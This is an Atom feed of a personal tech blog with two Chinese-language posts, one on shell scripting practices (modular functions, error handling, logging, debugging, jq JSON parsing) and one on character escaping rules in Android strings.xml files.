<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Deskid&#39;s Blog</title>
  
  <subtitle>/Life/Programing/Read/Think/Share</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://deskid.github.io/"/>
  <updated>2019-08-26T18:28:45.314Z</updated>
  <id>https://deskid.github.io/</id>
  
  <author>
    <name>deskid</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Shell 编程实践</title>
    <link href="https://deskid.github.io/2019/08/27/shell-in-action/"/>
    <id>https://deskid.github.io/2019/08/27/shell-in-action/</id>
    <published>2019-08-26T18:12:56.000Z</published>
    <updated>2019-08-26T18:28:45.314Z</updated>
    
    <content type="html"><![CDATA[<p>对于习惯了使用高级语言编程的程序员来说，shell 脚本的语法实在是有点原始。但是，shell 脚本开箱即用的特点使得它尤其适合在 Linux 服务器上运行。而例如 Python、NodeJS等语言都需要宿主上安装运行环境才可以使用。</p><p>最近出于工作的需要，写了不少 shell 脚本，这里简单记录下编写 shell 过程中的一些实践。</p><a id="more"></a><h2 id="一-模块化">一. 模块化</h2><p>许多 shell 脚本从头到尾都是命令的堆积，一个脚本上千行，一个命令做了N件事情，到处定义和引用全局变量。</p><p>其实 shell 脚本也需要按照功能划分模块，良好的模块拆分带来更好的代码可读性和可维护性，同时也方便测试。</p><h3 id="1-1-定义main函数">1.1 定义main函数</h3><p>一个shell脚本，可以像 Python 一样定义一个<code>__main__</code>函数</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span>!/usr/bin/env bash</span><br><span class="line"></span><br><span class="line">func1()&#123;</span><br><span class="line">    #do sth</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func2()&#123;</span><br><span class="line">    #do sth</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()&#123;</span><br><span class="line">    func1</span><br><span class="line">    func2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main "$@"</span><br></pre></td></tr></table></figure><p>这样可以方便的找到程序的入口和退出点。</p><h3 id="1-2-功能函数化">1.2 功能函数化</h3><p>正如一个类只负责一件事，在 shell 中一个 function 也应该只做一件事，并且我们要尽可能的将事情的步骤分解为function。</p><p>在写 shell function 时，和其他语言不一样，shell 中的变量声明默认是全剧作用域的。所以在定义函数内变量时总是要指定<code>local</code>关键字，如果该变量是只读(readonly)的常量，还可以加上<code>-r</code>。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">test1() &#123;</span><br><span class="line">  local -r var="$1"</span><br><span class="line">  var="balabala" # error: var: readonly variable</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shell 的函数定义不能指定入参名称和个数，也不能定义函数的返回值，参数及返回值的取值是按照下表约定的。</p><table><thead><tr><th>$参数</th><th>说明</th></tr></thead><tbody><tr><td><code>$0</code></td><td>当前脚本的名称</td></tr><tr><td><code>$1</code></td><td>命令的第一个参数</td></tr><tr><td><code>$2</code></td><td>命令的第二个参数</td></tr><tr><td>…</td><td>以此类推</td></tr><tr><td><code>$#</code></td><td>参数的个数</td></tr><tr><td><code>$*</code></td><td>单字符串表示的所有参数</td></tr><tr><td><code>$@</code></td><td>多字符串表示的所有参数</td></tr><tr><td><code>$?</code></td><td>返回值，0 正常退出</td></tr></tbody></table><p>函数的返回值有4种方式返回。</p><ul><li>在函数内将返回结果赋值给全局变量。</li><li>在函数内将结果通过<code>echo</code>输出到标准输出，由于标准输出是会被shell子进程继承的，所以这种方式支持子进程向父进程返回结果。</li><li>在函数内 <code>return 0/1</code> ，通过<code>$?</code>可以获取return的值。</li><li>通过写result文件返回结果，这种思路和赋值给全局变量一样，不过写文件很方便传递多行字符串结果。</li></ul><h3 id="1-3-脚本引用">1.3 脚本引用</h3><p>多个脚本之间复用的函数和公共参数可以抽为单独的文件，通过<code>source utils.sh</code> 来引入。不建议使用<code>sh</code> 和 <code>exec</code> 的方式调用别的shell脚本，除非你明确知道你在做什么。</p><h2 id="二-错误处理">二. 错误处理</h2><p>脚本中如果有运行失败的命令，shell 会默认继续执行，这个默认特性会给错误处理造成麻烦。</p><p>例如有时候，我们需要区分系统错误和业务错误：当碰到系统出错，脚本需要停止继续执行；当遇到业务错误，在处理完错误后，脚本可能需要继续执行。下面有几种方式可以控制 shell 的错误处理逻辑。</p><h3 id="2-1-使用短路逻辑运算符">2.1 使用短路逻辑运算符</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">command || exit 1</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">command</span><br><span class="line">if [ "$?" -ne 0 ]; then echo "command failed"; exit 1; fi</span><br></pre></td></tr></table></figure><p>如果<code>command</code>正常退出，返回0，<code>||</code> 运算符右半部分被短路，脚本继续执行。<br>如果<code>command</code>异常退出，返回非0， 运算符右半部分执行，脚本<code>exit 1</code>。</p><h3 id="2-2-使用-set-e">2.2 使用 <code>set -e</code></h3><p><code>set -e</code> 等价于<code>-o errexit</code>，表示打开 shell 脚本的错误退出选项，当脚本运行出现非零返回值时，不再继续运行下面的命令。</p><p><code>set +e</code> 表示关闭返回值判断选项，总是继续运行出错命令后面的命令。</p><p>配合这两个条命令，可以灵活的控制 shell 脚本处理业务错误和系统错误。</p><h3 id="2-3-使用-trap-捕获信号量">2.3 使用 <code>trap</code> 捕获信号量</h3><p>shell 脚本在运行期间会产生三种“伪信号量”，通过 <code>trap ‘command’ signal</code> 可以捕获这些信号。</p><table><thead><tr><th style="text-align:left">信号名</th><th style="text-align:left">何时产生</th></tr></thead><tbody><tr><td style="text-align:left">EXIT</td><td style="text-align:left">从一个函数中退出或整个脚本执行完毕</td></tr><tr><td style="text-align:left">ERR</td><td style="text-align:left">当一条命令返回非零状态时(代表命令执行不成功)</td></tr><tr><td style="text-align:left">DEBUG</td><td style="text-align:left">脚本中每一条命令执行之前</td></tr></tbody></table><p>其中监听 <code>ERR</code> 可以在使得我们在 shell 出错后，有机会做一些比如清理工作现场、发送错误、报警日志到IM等工作。</p><h2 id="三-调试">三. 调试</h2><p>shell 脚本没法直接调试，只能依靠print大法（有个开源工具<a href="http://bashdb.sourceforge.net/" target="_blank" rel="noopener">bashdb</a>，可以单步调试shell，对于大型的shell脚本可能有帮助），因此一个清晰的日志可以帮助排查很多问题。</p><h3 id="3-1-log-日志">3.1 log 日志</h3><ul><li>按照日期时间组织log文件</li><li>标准输出到terminal时，使用color</li><li>使用 tee 在标准输出的同时重定向到文件</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LOG_LEVEL_ALL=-1</span><br><span class="line">LOG_LEVEL_DEBUG=100</span><br><span class="line">LOG_LEVEL_INFO=200</span><br><span class="line">LOG_LEVEL_WARN=300</span><br><span class="line">LOG_LEVEL_ERROR=400</span><br><span class="line">LOG_LEVEL_OFF=9000</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ abc<span class="variable">$&#123;LOG_LEVEL&#125;</span> = <span class="string">"abc"</span> ]]; <span class="keyword">then</span></span><br><span class="line">    LOG_LEVEL=<span class="variable">$&#123;LOG_LEVEL_ALL&#125;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ abc<span class="variable">$&#123;LOG_4_SH_DIR&#125;</span> = <span class="string">"abc"</span> ]]; <span class="keyword">then</span></span><br><span class="line">    LOG_4_SH_DIR=<span class="variable">$&#123;WORK_PATH&#125;</span>/logs</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据日期获取当天日志名称</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getLogFile</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> [[ ! -e <span class="variable">$&#123;LOG_4_SH_DIR&#125;</span> ]]; <span class="keyword">then</span></span><br><span class="line">        mkdir -p <span class="variable">$&#123;LOG_4_SH_DIR&#125;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">local</span> logDate=$(date +<span class="string">"%Y%m%d"</span>)</span><br><span class="line">    <span class="built_in">local</span> todayLogFile=<span class="variable">$&#123;LOG_4_SH_DIR&#125;</span>/log_<span class="variable">$&#123;logDate&#125;</span>.<span class="built_in">log</span></span><br><span class="line">    <span class="keyword">if</span> [[ ! -e <span class="variable">$&#123;todayLogFile&#125;</span> ]]; <span class="keyword">then</span></span><br><span class="line">        touch <span class="variable">$&#123;todayLogFile&#125;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"############################ <span class="variable">$(date +%Y-%m-%d)</span> #######################"</span> &gt;&gt; <span class="variable">$&#123;todayLogFile&#125;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$&#123;todayLogFile&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> debug_color_print &#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">"\033[0;32m<span class="variable">$1</span>\033[0m"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">logDebug</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$&#123;LOG_LEVEL&#125;</span> -le <span class="variable">$&#123;LOG_LEVEL_DEBUG&#125;</span> ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">local</span> message=<span class="string">" [ "</span><span class="variable">$0</span><span class="string">" ] (DEBUG) "</span>$*</span><br><span class="line">        debug_color_print <span class="string">"<span class="variable">$message</span>"</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$&#123;message&#125;</span> &gt;&gt; $(getLogFile)</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$0</code> 代表当前shell脚本的名字<br><code>$LINENO</code> 代表shell脚本的当前行号<br><code>$FUNCNAME[]</code> 代表当前命令所属的函数名，通过遍历<code>$FUNCNAME[]</code>数组可以知道当前的函数调用栈。</p><h3 id="3-2-set-x">3.2 <code>set -x</code></h3><p><code>set -x</code>  进入跟踪方式，显示所执行的每一条命令。配合<code>trap command DEBUG</code>可以在显示执行命令前打印一些有用的帮助信息。</p><p>通过设置<code>export PS4='+{$LINENO:${FUNCNAME[0]}} '</code>还可以改变<code>set -x</code>模式下的输出格式，可以在每一条实际执行的命令前面显示其行号以及所属的函数名。</p><h2 id="四-一些有用的code-snipper">四. 一些有用的code snipper</h2><h3 id="4-1-获取当前工作目录">4.1 获取当前工作目录</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> get_working_dir()&#123;</span><br><span class="line">    <span class="built_in">local</span> CURRENT_DIR=$(<span class="built_in">pwd</span>)</span><br><span class="line">    <span class="built_in">local</span> WORK_DIR=$(dirname <span class="variable">$0</span>)</span><br><span class="line">    <span class="built_in">cd</span> ./<span class="variable">$&#123;WORK_DIR&#125;</span></span><br><span class="line">    WORK_DIR=$(<span class="built_in">pwd</span>)</span><br><span class="line">    <span class="built_in">cd</span> <span class="variable">$&#123;CURRENT_DIR&#125;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$&#123;WORK_DIR&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-json处理">4.2 json处理</h3><p>简单的 json 的处理，可以直接使用awk，sed、grep。如果有<code>Python</code> 环境，还可以用Python来帮助解析。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo_id=$(<span class="built_in">echo</span> <span class="variable">$repo_info_response</span> | python -c <span class="string">"import sys, json; print(json.load(sys.stdin)['id'])"</span>)</span><br></pre></td></tr></table></figure><p>不过最终还是推荐直接使用<a href="https://stedolan.github.io/jq" target="_blank" rel="noopener"> jq </a>。jq提供了一套完整的命令行环境下的json解析功能。使用jq时，如果有语法不熟悉的，可以用这个网站测试—— <a href="https://jqplay.org" target="_blank" rel="noopener">https://jqplay.org</a></p><ul><li>json decode</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 取 &#123; "id": "value"&#125; 中的id</span></span><br><span class="line">repo_id=$(<span class="built_in">echo</span> <span class="variable">$&#123;repo_info_response&#125;</span> | jq -r <span class="string">'.id'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取  [ &#123; "web_url": "value"&#125; ] 中的数组第一个</span></span><br><span class="line">mr_iid=$(<span class="built_in">echo</span> <span class="variable">$&#123;mr_iid_response&#125;</span> | <span class="variable">$&#123;JQ&#125;</span> -r <span class="string">'.[0]'</span>)</span><br><span class="line"><span class="comment"># 取  [ &#123; "web_url": "value"&#125; ] 中的数组第一个对象的web_url</span></span><br><span class="line">mr_web_url=$(<span class="built_in">echo</span> <span class="variable">$&#123;mr_iid_response&#125;</span> | <span class="variable">$&#123;JQ&#125;</span> -r <span class="string">'.[0].web_url'</span>)</span><br></pre></td></tr></table></figure><ul><li>json 数组遍历</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;response&#125;</span>"</span> | <span class="variable">$&#123;JQ&#125;</span> -r <span class="string">'.[] | @base64'</span>); <span class="keyword">do</span></span><br><span class="line">        <span class="function"><span class="title">_jq</span></span>() &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$&#123;row&#125;</span> | base64 --decode | <span class="variable">$&#123;JQ&#125;</span> -r <span class="variable">$&#123;1&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">local</span> language_repo_id=$(_jq <span class="string">'.id'</span>)</span><br><span class="line">        <span class="built_in">local</span> language_repo_name=$(_jq <span class="string">'.name'</span>)</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>注意这里 base64 是用来将json数组中的某一个多行元素转化为一行输出，方便 for 循环处理。</p><ul><li>json encode</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">message_json=<span class="string">"<span class="variable">$($&#123;JQ&#125; -nc --arg str "$message_text" '&#123;"text": $str&#125;')</span>"</span></span><br></pre></td></tr></table></figure><p>上面的代码将$message_text encode输出到<code>{&quot;text&quot;:&quot;message_text&quot;}</code>中。</p><h2 id="五-参考链接">五. 参考链接</h2><p><a href="http://www.ruanyifeng.com/blog/2017/11/bash-set.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2017/11/bash-set.html</a><br><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-shell-debug/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-cn-shell-debug/index.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于习惯了使用高级语言编程的程序员来说，shell 脚本的语法实在是有点原始。但是，shell 脚本开箱即用的特点使得它尤其适合在 Linux 服务器上运行。而例如 Python、NodeJS等语言都需要宿主上安装运行环境才可以使用。&lt;/p&gt;
&lt;p&gt;最近出于工作的需要，写了不少 shell 脚本，这里简单记录下编写 shell 过程中的一些实践。&lt;/p&gt;
    
    </summary>
    
      <category term="linux" scheme="https://deskid.github.io/categories/linux/"/>
    
      <category term="shell" scheme="https://deskid.github.io/categories/linux/shell/"/>
    
    
  </entry>
  
  <entry>
    <title>Android strings xml 的转义</title>
    <link href="https://deskid.github.io/2019/04/17/android-string-xml-escape/"/>
    <id>https://deskid.github.io/2019/04/17/android-string-xml-escape/</id>
    <published>2019-04-16T17:19:52.000Z</published>
    <updated>2019-04-16T17:28:41.335Z</updated>
    
    <content type="html"><![CDATA[<p>先看下面这个例子，如果能回答出这个strings.xml最终显示的结果，本文也不用看了。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"test1"</span>&gt;</span>test "string"<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"test2"</span>&gt;</span>test \"string\"<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"test3"</span>&gt;</span>test &amp;quot;string&amp;quot;<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"test4"</span>&gt;</span>test 'string'<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"test5"</span>&gt;</span>test \'string\'<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"test6"</span>&gt;</span>test &amp;apos;string&amp;apos;<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面例子显示结果如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test1 : test string</span><br><span class="line">test2 : test &quot;string&quot;</span><br><span class="line">test3 : test string</span><br><span class="line"></span><br><span class="line">test4 : test &apos;string&apos; //IDE lint 报错</span><br><span class="line">test5 : test &apos;string&apos;</span><br><span class="line">test6 : test &apos;string&apos; // 新GAP编译报错</span><br></pre></td></tr></table></figure><p>测试环境:</p><ul><li>gradle android plugin version: 3.1.0</li><li>gradle version 4.4</li></ul><blockquote><p>(注意，最新的GAP&gt;=3.3.2后，用<code>&amp;apos;</code>转义<code>'</code>不会在IDE lint中报错，但是会在<code>mergeResources</code>task执行时报错)</p></blockquote><p>TLDR</p><p>在android的strings.xml中的value转义规则如下</p><ol><li><p><code>&quot;</code> 转义只能用<code>\&quot;</code>, 不能用<code>&amp;quot;</code>，不转义的话不会报错，最终显示结果<code>&quot;</code>会被吞掉</p></li><li><p><code>'</code> 转义既可以用<code>&amp;apos;</code>, 也能用<code>\'</code>, 不转义的话 AS lint 会报错</p></li><li><p><code>&gt;</code> 不用转义</p></li><li><p><code>&lt;</code> 必须转义为<code>&amp;lt;</code>，不转义的话 AS lint 会报错</p></li><li><p><code>&amp;</code> 必须转义为<code>&amp;amp;</code>，不转义的话 AS lint 会报错</p></li><li><p><code>@</code> 、<code>?</code> 可以不用转义</p></li></ol><a id="more"></a><p>在xml的定义中，下面特殊字符因为有特殊的用处，因此当其出现在node value中时需要转义，转义规则如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp; - &amp;amp;</span><br><span class="line">&lt; - &amp;lt;</span><br><span class="line">&gt; - &amp;gt;</span><br><span class="line">&quot; - &amp;quot;</span><br><span class="line">&apos; - &amp;apos;</span><br></pre></td></tr></table></figure><p>比如在groovy的 <code>groovy.xml.XmlUtil</code>中对xml的text的转义如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String escapeXml(String orig) &#123;</span><br><span class="line">    return StringGroovyMethods.collectReplacements(orig, new Closure&lt;String&gt;((Object)null) &#123;</span><br><span class="line">        public String doCall(Character arg) &#123;</span><br><span class="line">            switch(arg) &#123;</span><br><span class="line">            case &apos;&quot;&apos;:</span><br><span class="line">                return &quot;&amp;quot;&quot;;</span><br><span class="line">            case &apos;&amp;&apos;:</span><br><span class="line">                return &quot;&amp;amp;&quot;;</span><br><span class="line">            case &apos;\&apos;&apos;:</span><br><span class="line">                return &quot;&amp;apos;&quot;;</span><br><span class="line">            case &apos;&lt;&apos;:</span><br><span class="line">                return &quot;&amp;lt;&quot;;</span><br><span class="line">            case &apos;&gt;&apos;:</span><br><span class="line">                return &quot;&amp;gt;&quot;;</span><br><span class="line">            default:</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里按照xml的规定处理了所有的转义。</p><p>android的string资源也是定义在xml中的，在<a href="https://developer.android.com/guide/topics/resources/string-resource" target="_blank" rel="noopener">官方文档</a>中也有说明这些特殊符号如何转义。</p><p><img src="http://img0.didiglobal.com/static/driver_xml_image/img/static/012403c3ff9e924c615186088fdd8742e99516e8.jpg" alt></p><p>可以见到这里对转义的处理有些不一样。这是因为android中的string既可以直接用在xml attribute中，也可以注册在strings.xml文件中。所以上面列举了双引号和单引号的几种不同处理方式。</p><p>再来看下android util 包下处理escapeText的函数</p><p><code>com.android.utils.XmlUtils.java</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line">     * Converts the given attribute value to an XML-text-safe value, meaning that</span><br><span class="line">     * less than and ampersand characters are escaped.</span><br><span class="line">     *</span><br><span class="line">     * @param textValue the text value to be escaped</span><br><span class="line">     * @return the escaped value</span><br><span class="line">     */</span><br><span class="line">    @NonNull</span><br><span class="line">    public static String toXmlTextValue(@NonNull String textValue) &#123;</span><br><span class="line">        for (int i = 0, n = textValue.length(); i &lt; n; i++) &#123;</span><br><span class="line">            char c = textValue.charAt(i);</span><br><span class="line">            if (c == &apos;&lt;&apos; || c == &apos;&amp;&apos;) &#123;</span><br><span class="line">                StringBuilder sb = new StringBuilder(2 * textValue.length());</span><br><span class="line">                appendXmlTextValue(sb, textValue);</span><br><span class="line">                return sb.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return textValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">     * Appends text to the given &#123;@link StringBuilder&#125; and escapes it as required for a DOM text</span><br><span class="line">     * node.</span><br><span class="line">     *</span><br><span class="line">     * @param sb the string builder</span><br><span class="line">     * @param start the starting offset in the text string</span><br><span class="line">     * @param end the ending offset in the text string</span><br><span class="line">     * @param textValue the text value to be appended and escaped</span><br><span class="line">     */</span><br><span class="line">    public static void appendXmlTextValue(</span><br><span class="line">            @NonNull StringBuilder sb, @NonNull String textValue, int start, int end) &#123;</span><br><span class="line">        for (int i = start, n = Math.min(textValue.length(), end); i &lt; n; i++) &#123;</span><br><span class="line">            char c = textValue.charAt(i);</span><br><span class="line">            if (c == &apos;&lt;&apos;) &#123;</span><br><span class="line">                sb.append(LT_ENTITY);</span><br><span class="line">            &#125; else if (c == &apos;&amp;&apos;) &#123;</span><br><span class="line">                sb.append(AMP_ENTITY);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                sb.append(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到这里并不是按照规范对全部特殊符号做了转义，这里只处理了<code>'&lt;'</code> <code>'&amp;'</code>。剩下的<code>&gt;</code>、<code>&quot;</code>、<code>'</code> 保留不动。这是因为其他的几种特殊字符，都是通过<code>\</code>来实现转义的。</p><p>测试后发现的规律总结如下：</p><ol><li><p><code>&quot;</code> 转义只能用<code>\&quot;</code>, 不能用<code>&amp;quot;</code>，不转义的话不会报错，最终显示结果<code>&quot;</code>会被吞掉</p></li><li><p><code>'</code> 转义 <s>既可以用<code>&amp;apos;</code></s> 不能用<code>&amp;quot;</code>会在编译期报错, <s>也</s> 只能用<code>\'</code>, 不转义的话 AS lint 会报错</p></li><li><p><code>&gt;</code> 不用转义</p></li><li><p><code>&lt;</code> 必须转义为<code>&amp;lt;</code>，不转义的话 AS lint 会报错</p></li><li><p><code>&amp;</code> 必须转义为<code>&amp;amp;</code>，不转义的话 AS lint 会报错</p></li><li><p><code>@</code> 、<code>?</code> 可以不用转义</p></li></ol><p>使用场景：</p><p>在通过插件或脚本处理strings.xml文件时，如果需要处理string value，一定不能按照xml的语言规范去转义，否则用于转义双引号的<code>\&quot;</code>Android写法会被标准实现转义处理为<code>&amp;quot;</code>,同理还有<code>\'</code>会被处理为<code>&amp;apos;</code>，从而导致编译失败或者显示在Android上时，字符被吞掉的情况。</p><p>所以最保险的做法在写android Groovy插件处理xml时，请认准<code>com.android.utils.XmlUtils.java</code>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先看下面这个例子，如果能回答出这个strings.xml最终显示的结果，本文也不用看了。&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;resources&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;test1&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;test &quot;string&quot;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;test2&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;test \&quot;string\&quot;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;test3&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;test &amp;amp;quot;string&amp;amp;quot;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;test4&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;test &#39;string&#39;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;test5&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;test \&#39;string\&#39;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;test6&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;test &amp;amp;apos;string&amp;amp;apos;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;resources&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面例子显示结果如下：&lt;/p&gt;
